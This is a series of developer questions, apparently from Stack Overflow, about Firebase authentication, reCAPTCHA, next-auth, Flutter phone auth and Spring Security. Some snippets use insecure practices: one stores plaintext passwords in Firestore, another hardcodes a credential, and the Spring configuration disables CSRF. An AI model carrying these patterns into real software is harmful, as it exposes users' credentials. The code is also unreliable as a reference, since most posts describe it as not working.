  password = &quot;password&quot;
};

/**
 * The initialized firebase Application.
 */
const firebase = initializeApp(firebaseConfig);

/**
 * The Auth instance of firbase.
 */
const auth = Auth.getAuth(firebase);

/**
 * The current provider.
 */
let currentProvider: AuthenticationProvider | undefined = undefined;

/**
 * The unsubscribe function of the authentication change listener.
 */
let unsubscribe: Auth.Unsubscribe | null;

/**
 * Check the current logged-in user.
 * @returns The currently logged-in user (or null).
 */
const getUser = (): FirebaseUser | null =&gt; {
  return auth.currentUser;
};

/**
 * Check the current provider.
 * @returns The current provider.
 */
const getProvider = (): AuthenticationProvider | undefined =&gt; {
  return currentProvider;
};

/**
 * Subscribe the authentication change, including login and logout.
 * @param onLogin The callback when user has logged in.
 * @param onLogout The callback when user has logged out.
 * @returns The current logged in Firebase user, null if not logged in.
 */
const subscribeAuthentication = async (onLogin: (user: FirebaseUser) =&gt; void, onLogout: () =&gt; void): Promise&lt;FirebaseUser | null&gt; =&gt; {
  let isInitialized = false;
  return new Promise((resolve) =&gt; {
    if (unsubscribe) {
      unsubscribe();
    }
    unsubscribe = Auth.onAuthStateChanged(auth, user =&gt; {
      if (isInitialized) {
        if (user) {
          onLogin(user);
        } else {
          onLogout();
        }
      } else {
        isInitialized = true;
        resolve(user);
      }
    });
  });
};

/**
 * Create a new user with email and password, will automatically login after creation.
 * @param email The email address of the user.
 * @param password The password of the user.
 * @returns The user that has been created.
 * @throws Error while creating user with email and password.
 */
const createUserWithEmailAndPassword = async (email: string, password: string): Promise&lt;FirebaseUser&gt; =&gt; {
  try {
    currentProvider = AuthenticationProvider.password;
    return (await Auth.createUserWithEmailAndPassword(auth, email, password)).user;
  } catch (error) {
    currentProvider = undefined;
    throw new Error(getRealMessageFromFirebaseError(error));
  }
}

/**
 * Login with email and password.
 * @param email The email address of the user.
 * @param password The password of the user.
 * @returns The user that has logged in.
 * @throws Error while logging in with email and password.
 */
const loginWithEmailAndPassword = async (email: string, password: string): Promise&lt;FirebaseUser&gt; =&gt; {
  try {
    currentProvider = AuthenticationProvider.password;
    return (await Auth.signInWithEmailAndPassword(auth, email, password)).user;
  } catch (error) {
    currentProvider = undefined;
    throw new Error(getRealMessageFromFirebaseError(error));
  }
};

/**
 * Send the verification email to the user if the user has not verified the email.
 * @param user The user to send verification email.
 * @param destination The destination path after the user has clicked on the link.
 * @returns True if the verification email has been sent, false if the user has already verified the email.
 * @throws Error while sending verification email.
 */
const sendVerificationEmailIfNeeded = async (user: FirebaseUser, destination: string): Promise&lt;boolean&gt; =&gt; {
  if (user.emailVerified) {
    return false;
  }
  try {
    Auth.sendEmailVerification(user, getActionCodeSettings(destination));
    return true;
  } catch (error) {
    throw new Error(getRealMessageFromFirebaseError(error));
  }
};

/**
 * Logout.
 * @returns The logout result.
 */
const logout = async (): Promise&lt;void&gt; =&gt; {
  return Auth.signOut(auth);
};

/**
 * Get the action code settings for Firebase.
 * @param destination The destination path after the user has clicked on the link.
 * @returns The action code settings for Firebase.
 * @private
 */
const getActionCodeSettings = (destination: string): Auth.ActionCodeSettings =&gt; {
  return {
    // URL you want to redirect back to. The domain (www.example.com) for this
    // URL must be in the authorized domains list in the Firebase Console.
    url: `${window.location.protocol}//${window.location.host}` + destination,
    // This must be true.
    handleCodeInApp: true,
    // NIU
    // iOS: {
    //   bundleId: 'com.example.ios'
    // },
    // android: {
    //   packageName: 'com.example.android',
    //   installApp: true,
    //   minimumVersion: '12'
    // },
    // dynamicLinkDomain: 'example.page.link'
  };
};

/**
 * Get the real error message from Firebase.
 * @param error The error object from Firebase.
 * @param defaultMessage The default error message to return if no specific error message found.
 * @returns The real error message from Firebase.
 * @private
 */
const getRealMessageFromFirebaseError = (error: any, defaultMessage?: string): string =&gt; {
  switch (error.code) {
    default:
      return defaultMessage ?? error.message;
  }
};
</code></pre>
<p>I'm using redux thunks to perform async logics, and following is the thunk I used to initialize user authentication, which is called during the initialization stage of my app. Some of the external dependancies are described in comments.</p>
<pre><code>// This is the method to create an async thunk.
import { createAsyncThunk } from '@reduxjs/toolkit';

// This is the authentication client.
import * as Auth from 'common/clients/firebase/authentication';

// This is the repository that will be used to store the authentication info locally.
import AuthRepo from 'common/repositories/authentication';

// These are the APIs that will be used to interact with the backend.
import { createUserIfNeeded, fetchUserInfo } from 'common/apis';


/**
 * The key of the initialization async thunk.
 */
const key = &quot;app/auth/init&quot;;

/**
 * The type of the backend user.
 */
type BackendUser = {
  /**
   * the fields are ignored here.
   */
};

/**
 * Authentication provider enum as in the client.
 */
enum AuthenticationProvider {
  /**
   * the fields are ignored here.
   */
};

/**
 * The type of the authentication info which will be used to update authentication info.
 */
type AuthenticationInfo = {
  /**
   * The logged-in user's private info.
   */
  user: BackendUser;

  /**
   * The firebase UID of the user.
   */
  firebaseUid: string;

  /**
   * The provider used for authentication.
   */
  provider: AuthenticationProvider;
}

/**
 * The props type for the initialization async thunk.
 */
type InitAsyncProps = {
  /**
   * A callback that will be called when the user info has changed (login/logout).
   * @param newValue The new value of the authentication info.
   * @param checkTime The timestamp when the user info is checked.
   */
  onAuthenticationUpdated: (newValue: AuthenticationInfo | undefined, checkTime: number) =&gt; void;

  /**
   * A callback that will be called when there is an error occurred durring authentication.
   * @param message The message of the error.
   */
  onAuthenticationFailed: (message: string) =&gt; void;
};

/**
 * The return type of the initialization async thunk.
 */
type InitAsyncResult = {
  /**
   * The indicator whether the initialized has completed successfully, undefined means in progress or already initialized.
   */
  isInitialized: boolean | undefined;
};

/**
 * This is a thunk that will be used to initialize authentication.
 * @param props The props for the initialization async thunk.
 * @param props.onAuthenticationUpdated A callback that will be called when the user info has changed (login/logout).
 * @param props.onAuthenticationFailed A callback that will be called when there is an error occurred durring authentication.
 * @returns Return the result including the indicator whether the initialized has completed successfully, failed or need to be skipped.
 */
const initAsync = createAsyncThunk(key, async (props: InitAsyncProps, thunkMethods): Promise&lt;InitAsyncResult&gt; =&gt; {
  const result: InitAsyncResult = {
    isInitialized: undefined
  };

  // If it is not initialized, or failed to initialize, try to initialize it.
  if (!(thunkMethods.getState() as any).authentication.isInitialized) {
    try {
      // Try to initialize authentication and return true after success.
      await onInitAsync(props.onAuthenticationUpdated, props.onAuthenticationFailed);
      result.isInitialized = true;
    } catch (error) {
      // If there is an error, log the error and return false.
      console.error(&quot;JZ: Failed to initialize authention with error:&quot;, error);
      result.isInitialized = false;
    }
  }

  return result;
});

/**
 * The async function for initializing authentication.
 * @param onAuthenticationUpdated A callback that will be called when the user info has changed (login/logout).
 * @param onAuthenticationFailed A callback that will be called when there is an error occurred durring authentication.
 */
const onInitAsync = async (
  onAuthenticationUpdated: (newValue: AuthenticationInfo | undefined, checkTime: number) =&gt; void,
  onAuthenticationFailed: (message: string) =&gt; void,
): Promise&lt;void&gt; =&gt; {
  // Try to register the callback for login/logout and get the current user.
  const currentUser = await Auth.subscribeAuthentication(
    firebaseUser =&gt; onFirebaseLogin(firebaseUser, onAuthenticationUpdated, onAuthenticationFailed),
    () =&gt; onAuthenticationUpdated(undefined, Date.now())
  );

  // Try to validate and fetch user info if there is a previously logged-in user.
  if (currentUser) {
    console.log(&quot;JZ: Found previously logged-in user.&quot;);
    // Force refreshing ID token to verify whether the current login has expired.
    try {
      currentUser.getIdToken(true);
    } catch (error) {
      console.error(&quot;JZ: Failed to get ID token, logout instead.&quot;);
      onAuthenticationFailed(&quot;Failed to get token.&quot;);
      await Auth.logout();
    }
    // Obtain the user meta info stored locally.
    const userMeta = AuthRepo.getMeta();
    // If there is stored user meta info and the stored Firebase UID is consistant with the current user obtained from Firebase, perform the fetching, otherwise try to logout from Firebase.
    if (userMeta !== undefined &amp;&amp; currentUser.uid === userMeta.firebaseUid) {
      console.log(&quot;JZ: The locally stored user info is consistent with the logged in Firebase user, try to fetch user info.&quot;);
      try {
        // Fetch user info.
        const user = await fetchUserInfo({ privateId: userMeta.privateId });
        // Call the callback listening to the user info change and return.
        onAuthenticationUpdated({ ...userMeta, user }, Date.now());
        return;
      } catch (error) {
        // If there is an error, log the error, call the callback listening to the error and try to logout from Firebase.
        console.error(&quot;JZ: Failed to fetch user info with error:&quot;, error);
        onAuthenticationFailed(&quot;Failed to retrieve user info.&quot;);
        await Auth.logout();
      }
    } else {
      // If there is no stored user info is not consistent with the logged in Firebase user, log the error, call the callback listening to the error and try to logout from Firebase.
      console.error(&quot;JZ: The locally stored user info does not exist or is not consistent with the logged in Firebase user, try to clear the locally stored user and logout from Firebase.&quot;);
      onAuthenticationFailed(&quot;Inconsistent user info.&quot;);
      await Auth.logout();
    }
  } else {
    console.log(&quot;JZ: There is no previously logged-in user.&quot;);
  }

  // If anything goes wrong, which causes the function not to return, call the callback listening to the user info change with undefined.
  onAuthenticationUpdated(undefined, Date.now());
};

/**
 * The callback then the user has logged in to firebase.
 * @param firebaseUser The logged in firebase user.
 * @param onAuthenticationUpdated A callback that will be called when the user info has changed (login/logout).
 * @param onAuthenticationFailed A callback that will be called when there is an error occurred durring authentication.
 */
const onFirebaseLogin = async (
  firebaseUser: Auth.FirebaseUser,
  onAuthenticationUpdated: (newValue: AuthenticationInfo | undefined, checkTime: number) =&gt; void,
  onAuthenticationFailed: (message: string) =&gt; void
): Promise&lt;void&gt; =&gt; {
  const requestTime = Date.now();
  // Try to get the current provider.
  const provider = Auth.getProvider();
  // If the provider is not undefined, try to create/fetch user info, 
  // then call the callback listening to the user info change and return.
  if (provider !== undefined) {
    try {
      // Create or fetch user info.
      const user = await createUserIfNeeded({
        token: await firebaseUser.getIdToken(),
        provider: provider
      });
      // Call the callback listening to the user info change and return.
      onAuthenticationUpdated({ user, firebaseUid: firebaseUser.uid, provider }, requestTime);
      return;
    } catch (error) {
      // If there is an error, log the error, call the callback listening to the error and try to logout from Firebase.
      console.error(&quot;JZ: Failed to create/fetch user info with error:&quot;, error);
      onAuthenticationFailed(&quot;Failed to fetch user info.&quot;);
      await Auth.logout();
    }
  } else {
    // If the provider is undefined, log the error, call the callback listening to the error and try to logout from Firebase.
    console.error(&quot;JZ: Invalid Login, no provider is provided, try to logout from Firebase.&quot;);
    onAuthenticationFailed(&quot;Invalid login.&quot;);
    await Auth.logout();
  }

  // If anything goes wrong, which causes the function not to return, call the callback listening to the user info change with undefined.
  onAuthenticationUpdated(undefined, Date.now());
};
</code></pre>
"
"<p>So even in Google reCAPTCHA site it says:</p>
<blockquote>
<p>We detected that your site is not verifying reCAPTCHA solutions. This
is required for the proper use of reCAPTCHA on your site. Please see
our developer site for more information.</p>
</blockquote>
<p>And in console.log I get Token: null.</p>
<p>What have I done wrong here?</p>
<p>HTML:</p>
<pre><code>  &lt;script src=&quot;https://www.google.com/recaptcha/api.js&quot; async defer&gt;&lt;/script&gt;
  &lt;form id=&quot;yourFormId&quot;&gt;
                    &lt;div class=&quot;input-group input-group-outline mb-3&quot;&gt;
                      &lt;label class=&quot;form-label&quot; id=&quot;nameLabel&quot;&gt;Namn&lt;/label&gt;
                      &lt;input id=&quot;inputName&quot; type=&quot;text&quot; class=&quot;form-control&quot;&gt;
                  &lt;/div&gt;
                  &lt;div class=&quot;input-group input-group-outline mb-3&quot;&gt;
                      &lt;label class=&quot;form-label&quot; id=&quot;emailLabel&quot;&gt;E-post&lt;/label&gt;
                      &lt;input id=&quot;inputEmail&quot; type=&quot;email&quot; class=&quot;form-control&quot;&gt;
                  &lt;/div&gt;
                  &lt;div class=&quot;input-group input-group-outline mb-3 position-relative&quot;&gt;
                    &lt;label class=&quot;form-label&quot; id=&quot;passwordLabel&quot;&gt;Lösenord&lt;/label&gt;
                    &lt;input id=&quot;inputPassword&quot; type=&quot;password&quot; class=&quot;form-control&quot;&gt;
                
                &lt;/div&gt;
                 
                  &lt;/div&gt;
                  &lt;div class=&quot;text-center&quot;&gt;
                    &lt;button id=&quot;create-newuser-button&quot; type=&quot;submit&quot; class=&quot;btn btn-lg bg-gradient-info btn-lg w-100 mt-4 mb-0&quot;&gt;Skapa Konto&lt;/button&gt;
                  &lt;/div&gt;
                                        &lt;div class=&quot;g-recaptcha&quot; data-sitekey=&quot;my-site-key&quot; data-callback=&quot;onRecaptchaSuccess&quot; data-size=&quot;invisible&quot;&gt;&lt;/div&gt;
                &lt;/form&gt;
      &lt;script src=&quot;../sso/sign-up.js&quot; type=&quot;module&quot;&gt;&lt;/script&gt;
</code></pre>
<p>/sso/sign-up.js:</p>
<pre><code>$(document).ready(function () {

        // Show labels when the page loads
        $(&quot;#nameLabel, #emailLabel, #passwordLabel&quot;).show();
        $(&quot;#warningMessage, #passwordLengthAlert, #success-message&quot;).hide();
    
        // Add event listeners to show/hide labels as the user types
        function toggleLabelVisibility(inputField, label) {
            if (inputField.val().length &gt; 0) {
                label.hide();
            } else {
                label.show();
            }
        }
    
        $(&quot;#inputName&quot;).on(&quot;input&quot;, function () {
            toggleLabelVisibility($(this), $(&quot;#nameLabel&quot;));
        });
    
        $(&quot;#inputEmail&quot;).on(&quot;input&quot;, function () {
            toggleLabelVisibility($(this), $(&quot;#emailLabel&quot;));
        });
    
        $(&quot;#inputPassword&quot;).on(&quot;input&quot;, function () {
            toggleLabelVisibility($(this), $(&quot;#passwordLabel&quot;));
    
            // Check password length and display alert if less than 6 characters
            var password = $(this).val();
            if (password.length &lt; 6) {
                $(&quot;#passwordLengthAlert&quot;).show();
            } else {
                $(&quot;#passwordLengthAlert&quot;).hide();
            }
        });
    
        $(&quot;#create-newuser-button&quot;).click(function () {
            // Hide the warning message at the beginning of the validation logic
            $(&quot;#warningMessage&quot;).hide();

                 // Execute invisible reCAPTCHA with the callback
            grecaptcha.execute(undefined, { action: 'submit' }).then(onRecaptchaSuccess);
    
            var name = $(&quot;#inputName&quot;).val();
            var email = $(&quot;#inputEmail&quot;).val();
            var password = $(&quot;#inputPassword&quot;).val();
            var checkboxChecked = $(&quot;#flexCheckDefault&quot;).is(&quot;:checked&quot;);
    
            if (name.trim() === '' || email.trim() === '' || password.trim() === '' || !checkboxChecked || password.length &lt; 6) {
                // Show the warning message or password length alert
                $(&quot;#warningMessage&quot;).show();
                $(&quot;#success-message&quot;).hide();
    
                // Auto-dismiss the warning message after 3 seconds
                setTimeout(function () {
                    $(&quot;#warningMessage&quot;).hide();
                }, 3000);
    
                return; // Stop further processing
            }

            // Create a new user in Firebase Auth
            firebase.auth().createUserWithEmailAndPassword(email, password)
                .then(function (userCredential) {
                    // User creation was successful
                    var user = userCredential.user;

                    user.sendEmailVerification()
                        .then(function() {
                            console.log(&quot;Email verification sent&quot;);
                        })
                        .catch(function(error) {
                            console.error(&quot;Error sending email verification: &quot;, error);
                        });

                    // Now, store additional user data in Firestore
                    return db.collection(&quot;users&quot;).doc(user.uid).set({
                        uid: user.uid, // Store the uid
                        email: email,
                        password: password,
                        displayName: name,
                    });
                })
                .then(function () {
                    // Additional logic after Firestore write success
                    console.log(&quot;User data successfully written to Firestore!&quot;);

                    // Show the success message
                    $(&quot;#success-message&quot;).show();
                    console.log(&quot;About to show success message&quot;);

                    setTimeout(function() {
                    window.location.href = &quot;/pages/home.html&quot;;
                }, 5000);

                    // Auto-dismiss the success message after 10 seconds
                    setTimeout(function () {
                        $(&quot;#success-message&quot;).hide();
                    }, 10000);
                })
                .catch(function (error) {
                    // Handle errors during user creation or Firestore write
                    console.error(&quot;Error creating user or writing data to Firestore: &quot;, error);

                    // Show the warning message and auto-dismiss after 3 seconds
                    $(&quot;#warningMessage&quot;).show();
                    $(&quot;#success-message&quot;).hide();

                    // Auto-dismiss the warning message after 3 seconds
                    setTimeout(function () {
                        $(&quot;#warningMessage&quot;).hide();
                    }, 3000);
                });
        });
    });
    
    function onRecaptchaSuccess(token) {
        // Log the reCAPTCHA token to the console
        console.log(&quot;reCAPTCHA Token:&quot;, token);
    
        // Execute your authentication logic inside the promise chain
        firebase.auth().signInWithRecaptcha(token)
            .then(function (userCredential) {
                // Handle successful authentication
                var user = userCredential.user;
                console.log(&quot;Authentication successful:&quot;, user);
    
                // Now you can proceed with the rest of your logic
            })
            .catch(function (error) {
                // Handle authentication error
                console.error(&quot;Authentication error:&quot;, error);
            });
    }
</code></pre>
"
"<p>I can't install the new project in IOS simulator. When I run</p>
<blockquote>
<p>pod install</p>
</blockquote>
<p>I get &quot;FirebaseAuth requires CocoaPods version 1.12.0 which is not satisfied by your current version 1.11.3&quot; message.
I have executed the below command to update pods but after this when I enter pod install it gives me the error.</p>
<blockquote>
<p>sudo gem install cocoapods</p>
</blockquote>
"
"<p>i having problem with next auth the next -auth is not interacting with user creation  for session and jwt and callbacks and adapter it should directly store without writing   explicitly stored data, just see in <strong>StuReg.ts</strong></p>
<p><strong>components/auth/StuRegForm.tsx</strong> student register form</p>
<pre><code>&quot;use client&quot;
import * as z from &quot;zod&quot;;
import {CardWapper} from &quot;./Card-Wapper&quot;;
import {useForm} from &quot;react-hook-form&quot;
import {zodResolver} from &quot;@hookform/resolvers/zod&quot;;
import {RegisterSchema} from &quot;@/schemas&quot;;
import {Input} from &quot;@/components/ui/input&quot;;
import {Button} from &quot;@/components/ui/button&quot;;
import {useState, useTransition} from &quot;react&quot;;
import{
    Form,
    FormControl,
    FormField,
    FormItem,
    FormLabel,
    FormMessage,
} from &quot;@/components/ui/form&quot;
import { FormError } from &quot;@/components/form-error&quot;;
import { FormSuccuss } from &quot;../form-succuss&quot;;
import { StuReg } from &quot;@/actions/StuReg&quot;;

export const StuRegForm=()=&gt;{
    const [error,setError]=useState&lt;string | undefined&gt;(&quot;&quot;);
    const [success,setSuccess]=useState&lt;string | undefined&gt;(&quot;&quot;);
    const [ispending, startTransition]=useTransition();
    const form=useForm&lt;z.infer&lt;typeof RegisterSchema&gt;&gt;({
        resolver:zodResolver(RegisterSchema),
        defaultValues:{
            name:&quot;&quot;,
            email:&quot;&quot;,
            password:&quot;&quot;,
            confirmPassword:&quot;&quot;
        },
    })
    const onSubmit=(values: z.infer&lt;typeof RegisterSchema&gt;)=&gt;{
        setError(&quot;&quot;);
        setSuccess(&quot;&quot;);
        startTransition(()=&gt;{
            StuReg(values)
            .then((data)=&gt;{
                setError(data.error);
                setSuccess(data.success)
            })
        })

    }
    return(
        &lt;&gt;
        &lt;CardWapper
        headerLabel=&quot;Creat an account&quot;
        backButtonLabel=&quot;Return to your profile&quot;
        backButtonHref=&quot;/auth/admin/profile&quot;
        &gt;
            &lt;Form {...form}&gt;
&lt;form onSubmit={form.handleSubmit(onSubmit)}
className=&quot;space-y-6&quot;
&gt;
    &lt;div className=&quot;space-y-4&quot;&gt;
    &lt;FormField
control={form.control}
name=&quot;name&quot;
render={({field})=&gt;(
    &lt;FormItem&gt;
        &lt;FormLabel className=&quot;after:content-['*'] after:ml-0.5 after:text-red-500 block text-sm font-medium &quot;&gt;User Name&lt;/FormLabel&gt;
        &lt;FormControl&gt;
            &lt;Input
            {...field}
            disabled={ispending}
            placeholder=&quot;john deo&quot;
            className=&quot; placeholder-slate-400&quot;
            /&gt;
        &lt;/FormControl&gt;
        &lt;FormMessage/&gt;
    &lt;/FormItem&gt;
)}
/&gt;
&lt;FormField
control={form.control}
name=&quot;email&quot;
render={({field})=&gt;(
    &lt;FormItem&gt;
        &lt;FormLabel className=&quot;after:content-['*'] after:ml-0.5 after:text-red-500 block text-sm font-medium &quot;&gt;Email&lt;/FormLabel&gt;
        &lt;FormControl&gt;
            &lt;Input
            {...field}
            disabled={ispending}
            placeholder=&quot;john.doe@example.com&quot;
            type=&quot;email&quot;
            /&gt;
        &lt;/FormControl&gt;
        &lt;FormMessage/&gt;
    &lt;/FormItem&gt;
)}
/&gt;
&lt;FormField
control={form.control}
name=&quot;password&quot;
render={({field})=&gt;(
    &lt;FormItem&gt;
        &lt;FormLabel className=&quot;after:content-['*'] after:ml-0.5 after:text-red-500 block text-sm font-medium &quot;&gt;Password&lt;/FormLabel&gt;
        &lt;FormControl&gt;
            &lt;Input
            {...field}
            disabled={ispending}
            placeholder=&quot;******&quot;
            type=&quot;password&quot;
            /&gt;
        &lt;/FormControl&gt;
        &lt;FormMessage/&gt;
    &lt;/FormItem&gt;
    
)}
/&gt;
&lt;FormField
control={form.control}
name=&quot;confirmPassword&quot;
render={({field})=&gt;(
    &lt;FormItem&gt;
        &lt;FormLabel className=&quot;after:content-['*'] after:ml-0.5 after:text-red-500 block text-sm font-medium &quot;&gt;Confirm Password&lt;/FormLabel&gt;
        &lt;FormControl&gt;
            &lt;Input
            {...field}
            disabled={ispending}
            placeholder=&quot;******&quot;
            type=&quot;password&quot;
            /&gt;
        &lt;/FormControl&gt;
        &lt;FormMessage/&gt;
    &lt;/FormItem&gt;
    
)}
/&gt;
   &lt;FormSuccuss message={success}/&gt;
   &lt;FormError message={error}/&gt;
    &lt;/div&gt;
    &lt;Button type=&quot;submit&quot;
    disabled={ispending}
    className=&quot;w-full text-black bg-orange-600 rounded-2xl font-semibold hover:bg-black hover:text-white hover:font-extrabold
    &quot;&gt;
Registor
    &lt;/Button&gt;
&lt;/form&gt;
            &lt;/Form&gt;
        &lt;/CardWapper&gt;
            &lt;/&gt;
    )
}
</code></pre>
<p><strong>action/StuReg.ts file</strong> in this user is created and stored in database ,but data must store all the user information someone try to fix this</p>
<pre><code>&quot;use server&quot;;
import { RegisterSchema } from &quot;@/schemas&quot;;
import { adminDb, adminAuth } from &quot;@/firebase/admin&quot;;
import bcrypt from &quot;bcrypt&quot;;

export const StuReg = async (values: any) =&gt; {
  try {
    // Validate user data
    const validatedFields = RegisterSchema.parse(values);
    const { email, password, name} = validatedFields;
    const hashedPassword=await bcrypt.hash(password,10);
    const user = await adminAuth.createUser({
      email,
      password,
      displayName: name,
    });
    console.log(user);
  
    await adminDb.collection('users').doc(user.uid).set({
      name,
      email,
      hashedPassword
    });
    
    return { success: &quot;Account created successfully!&quot; };
  } catch (error) {
    if (error instanceof Error) {
      // Handle specific errors (e.g., email already exists)
        return { error: &quot;User already exists&quot; };
      } else {
        return { error: &quot;An unknown error occurred&quot; };
      }
  }
};
</code></pre>
<p><strong>auth.ts</strong> in this i having problem with next auth the next -auth is not interacting with StuReg.ts for session and jwt and callbacks and adapter it should directly store without writing   await</p>
<pre><code>adminDb.collection('users').doc(user.uid).set({
name,
email,
hashedPassword
});
</code></pre>
<p>in StuReg.ts file</p>
<p>// auth.ts</p>
<pre><code>import { NextAuthOptions } from &quot;next-auth&quot;;
import { FirestoreAdapter } from &quot;@auth/firebase-adapter&quot;;
import { adminDb, adminAuth } from &quot;@/firebase/admin&quot;;
import { StuReg } from &quot;./actions/StuReg&quot;;
import CredentialsProvider from &quot;next-auth/providers/credentials&quot;;

export const authOptions: NextAuthOptions = {
  providers: [
    CredentialsProvider({
      id: &quot;Student-reg&quot;,
      name: &quot;Student-register&quot;,
      authorize: async (credentials: any) =&gt; {
        try {
          const { success, error } = await StuReg(credentials); // Call StuReg function
          if (error) {
            throw new Error(error); // Re-throw error for NextAuth handling
          }
          return null; // NextAuth handles successful registration automatically
        } catch (error) {
          console.error(&quot;Error creating user:&quot;, error);
          throw error; // Re-throw error for user-facing feedback
        }
      },
    }),
  ],
  callbacks: {
    session: async ({ session, token }) =&gt; {
      if (session?.user) {
        if (token.sub) {
          session.user.id = token.sub;
          const firebaseToken = await adminAuth.createCustomToken(token.sub);
          session.firebaseToken = firebaseToken;
        }
      }
      return session;
    },
    jwt: async ({ user, token }) =&gt; {
      if (user) {
        token.sub = user.id;
      }
      return token;
    },
  },
  session: {
    strategy: 'jwt',
  },
  adapter: FirestoreAdapter(adminDb),
} satisfies  NextAuthOptions;
</code></pre>
"
"<p>I am trying to write a code to send the verification code to SMS using Firebase Phone Auth .
but i got this error message :
E/FirebaseAuth(23757): [SmsRetrieverHelper] SMS verification code request failed: unknown status code: 17093 null
error img <a href=""https://i.stack.imgur.com/bM18H.png"" rel=""nofollow noreferrer"">error img</a>
my code</p>
<pre><code>void phoneAuth() async {
 await FirebaseAuth.instance.verifyPhoneNumber(
  phoneNumber: &quot;+966534341376&quot;,
  verificationCompleted: verificationComplete,
      verificationFailed: (FirebaseAuthException e) {
        if (e.code == 'invalid-phone-number') {
           print(&quot;the phone number not valid&quot;);
        } else {
           print(e);
        }
      },
      codeSent: (String verificationId, int? resendToken) 
      async {
      
      },
     
      timeout: const Duration(seconds: 60),
      codeAutoRetrievalTimeout: (String verificationId) {},
      
   );
}
</code></pre>
<p>img of function
<a href=""https://i.stack.imgur.com/JNJ9e.png"" rel=""nofollow noreferrer"">function code img</a></p>
<p>here button calld function</p>
<pre><code>MaterialButton(
padding: EdgeInsets.symmetric(
   horizontal:
   smolewidt ? width * 0.12 : width * 0.28,vertical: 8),
     shape: RoundedRectangleBorder(borderRadius: n 
      BorderRadius.circular(15.0),
      side: BorderSide(color: Colors.white)),
      color: sharedPref.getBool(&quot;mode&quot;) ?? &quot;&quot; == true
            ? redColor.primaryColor
            : redColor.primaryColor,
             onPressed: () async {
             phoneAuth();
             },
              child: Text(&quot;تسجيل جديد&quot;,
              style: TextStyle(
              color: Colors.white,
              fontWeight: FontWeight.bold,
              fontSize: 19,
              fontFamily: &quot;NotoKufiArabic&quot;))),
</code></pre>
"
"<p>I have google sign in React component as below. This user login is working fine. And then I load home page and home page has user image in the header section.</p>
<pre><code>import { useState, useEffect } from &quot;react&quot;;
import { GoogleAuthProvider, signInWithPopup } from &quot;firebase/auth&quot;;

import &quot;firebase/auth&quot;;
import { useNavigate } from &quot;react-router-dom&quot;;
import { auth } from &quot;../firebase&quot;;

const provider = new GoogleAuthProvider();

const SignIn = () =&gt; {
  const [user, setUser] = useState(null);
  console.log(user);
  const navigate = useNavigate();

  // Get initial theme from local storage (if available)
  useEffect(() =&gt; {
    const isDark = localStorage.getItem(&quot;theme&quot;) === &quot;dark&quot;;
    if (isDark) {
      document.documentElement.classList.add(&quot;dark&quot;);
    } else {
      document.documentElement.classList.remove(&quot;dark&quot;);
    }
  }, []);
  const handleGoogleSignIn = async () =&gt; {
    try {
      const result = await signInWithPopup(auth, provider);
      const credential = GoogleAuthProvider.credentialFromResult(result);
      console.log(credential);
      const user = result.user;
      setUser(user);
      navigate(&quot;/&quot;);
    } catch (error) {
      console.error(&quot;Error signing in with Google:&quot;, error);
    }
  };

  return (
    &lt;div className=&quot;flex flex-col items-center justify-center h-screen dark:bg-neutral-800&quot;&gt;
      &lt;button
        type=&quot;button&quot;
        className=&quot;text-white bg-[#4285F4] hover:bg-[#4285F4]/90 focus:ring-4 focus:outline-none focus:ring-[#4285F4]/50 font-medium rounded-lg text-sm px-5 py-2.5 text-center inline-flex items-center dark:focus:ring-[#4285F4]/55 me-2 mb-2&quot;
        onClick={handleGoogleSignIn}
      &gt;
        &lt;svg
          className=&quot;w-4 h-4 me-2&quot;
          aria-hidden=&quot;true&quot;
          xmlns=&quot;http://www.w3.org/2000/svg&quot;
          fill=&quot;currentColor&quot;
          viewBox=&quot;0 0 18 19&quot;
        &gt;
          &lt;path
            fillRule=&quot;evenodd&quot;
            d=&quot;M8.842 18.083a8.8 8.8 0 0 1-8.65-8.948 8.841 8.841 0 0 1 8.8-8.652h.153a8.464 8.464 0 0 1 5.7 2.257l-2.193 2.038A5.27 5.27 0 0 0 9.09 3.4a5.882 5.882 0 0 0-.2 11.76h.124a5.091 5.091 0 0 0 5.248-4.057L14.3 11H9V8h8.34c.066.543.095 1.09.088 1.636-.086 5.053-3.463 8.449-8.4 8.449l-.186-.002Z&quot;
            clipRule=&quot;evenodd&quot;
          /&gt;
        &lt;/svg&gt;
        Sign in with Google
      &lt;/button&gt;
    &lt;/div&gt;
  );
};

export default SignIn;
</code></pre>
<p>Then I have another component to get the signed in user.</p>
<pre><code>import React, { useEffect, useState } from &quot;react&quot;;
import { onAuthStateChanged } from &quot;firebase/auth&quot;;
import QuizCard from &quot;./components/quiz-card&quot;;
import HomeLoading from &quot;./components/home-loading&quot;;
import QuizHomeLayout from &quot;./components/quiz-home-layout&quot;;
import { auth } from &quot;../firebase&quot;;

const QuizHome = () =&gt; {
  const [homeData, setHomeData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [user, setUser] = useState(null);

  async function fetchQuizData() {
    try {
      const serverHomeData = await fetch(
        `https://storage.googleapis.com/kobello.appspot.com/home.json`
      ).then((res) =&gt; res.json());
      setHomeData(serverHomeData);

      setLoading(false);
    } catch (error) {
      console.error(error);
    }
  }

  useEffect(() =&gt; {
    fetchQuizData();
  }, []);

  useEffect(() =&gt; {
    onAuthStateChanged(auth, (user) =&gt; {
      if (user) {
        setUser(user);
        console.log(user);
      } else {
        console.log(&quot;No user is signed in.&quot;);
      }
    });
  }, []);

  if (loading) {
    return &lt;HomeLoading /&gt;;
  }
  return (
    &lt;React.Fragment&gt;
      &lt;QuizHomeLayout user={user}&gt;
        {homeData &amp;&amp;
          homeData.map((data, key) =&gt; &lt;QuizCard key={key} data={data} /&gt;)}
      &lt;/QuizHomeLayout&gt;
    &lt;/React.Fragment&gt;
  );
};

export default QuizHome;
</code></pre>
<p>This component works fine just after the sign in and if I refresh the web page onAuthStateChanged return no user. How to get the logged in user anytime inside any component ?</p>
"
"<p>After upgrading to Spring Boot 3/Spring Security 6, my service is experiencing an error where after authentication, after redirecting to the app page, it redirects to the authentication page again, causing a loop. It appears that the authenticated session is not being stored.</p>
<p>The major change was upgrading the SecurityConfig to use SecurityFilterChain instead of WebSecurityConfigurerAdapter as seen below:</p>
<pre><code>public SecurityFilterChain auth(HttpSecurity http) throws Exception {
        http.csrf().disable()
                .authorizeRequests()
                .requestMatchers(&quot;/error&quot;, &quot;/forbidden&quot;, &quot;/health&quot;, &quot;/login**&quot;)
                .permitAll()
                .anyRequest()
                .authenticated()
                .and()
                .oauth2Login()
                .successHandler(myAuthenticationSuccessHandler)
                .failureHandler(myAuthenticationFailureHandler);
        return http.build();
}
</code></pre>
